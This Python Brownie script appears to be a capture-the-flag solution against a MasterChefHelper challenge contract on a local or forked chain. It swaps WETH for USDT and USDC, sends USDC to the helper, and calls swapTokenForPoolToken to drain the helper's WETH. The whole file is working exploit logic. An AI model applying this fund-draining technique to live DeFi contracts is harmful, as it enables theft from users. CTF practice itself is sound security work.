from brownie import Setup, WETH9, MasterChefHelper, TestERC20
from brownie import accounts, network, config, chain, interface
from web3 import Web3
import sys

LOCAL_ENVS = ['development', 'ganache', 'mainnet-fork']

get_acc = lambda: accounts[0] if (
    network.show_active() in LOCAL_ENVS
) else accounts.add(config['wallets']['from_key'])

from_me = {'from': get_acc()}


def deploy_infra():
    weth9 = WETH9.at(
        '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
    )
    setuper = Setup.deploy(
        {'from': get_acc(), 'value': Web3.toWei(10, 'ether')}
    )
    chain.mine(1)
    chef = MasterChefHelper.at(setuper.mcHelper())
    return weth9, setuper, chef


def main():
    weth9, setuper, chef_helper = deploy_infra()
    weth9.deposit({'from': get_acc(), 'value': Web3.toWei(80, 'ether')})
    router = interface.UniswapV2RouterLike(
        '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F'
    )
    chef = interface.MasterChefLike(
        '0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd'
    )
    
    _len = chef.poolLength()
    usdc_index = 0
    for i in range(_len):
        data = chef.poolInfo.call(i, {'from': get_acc()})
        lp = interface.UniswapV2PairLike(data[0])
        t0 = lp.token0.call({'from': get_acc()})
        t1 = lp.token1.call({'from': get_acc()})
        if ((
            t0 == '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
        ) and (t1 == '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')) or ((
            t1 == '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
        ) and (t0 == '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')):
            usdc_index = i
            break
    print(usdc_index) 
    data = chef.poolInfo.call(usdc_index, {'from': get_acc()})
    lp = interface.UniswapV2PairLike(data[0])
    t0 = lp.token0.call({'from': get_acc()})
    t1 = lp.token1.call({'from': get_acc()})
    print(t0)
    print(t1)
    input('Continue?')
    usdt = interface.ERC20Like(
        '0xdAC17F958D2ee523a2206206994597C13D831ec7'
    )
    usdc = interface.ERC20Like(
        '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
    )
    weth9.approve(router, weth9.balanceOf(get_acc()), {'from': get_acc()})
    
    router.swapExactTokensForTokens(
        Web3.toWei(0.001, 'ether'),
        0,
        [weth9, usdt],
        get_acc(),
        2661017078,
        {'from': get_acc()}
    )
    router.swapExactTokensForTokens(
        Web3.toWei(11, 'ether'),
        0,
        [weth9, usdc],
        get_acc(),
        2661017078,
        {'from': get_acc()}
    )
    usdc.transfer(chef_helper, usdc.balanceOf(get_acc()), {'from': get_acc()})
    
    usdt.approve(chef_helper, usdt.balanceOf(get_acc()), {'from': get_acc()})

    tx = chef_helper.swapTokenForPoolToken(
        usdc_index,
        usdt,
        usdt.balanceOf(get_acc()),
        0,
        {'from': get_acc()}
    )
    tx.wait(1)
    
    final_bal = Web3.fromWei(weth9.balanceOf(chef_helper), 'ether')

    print(f'Final helper weth bal: {final_bal}')
    print(f'Usdc index: {usdc_index}')

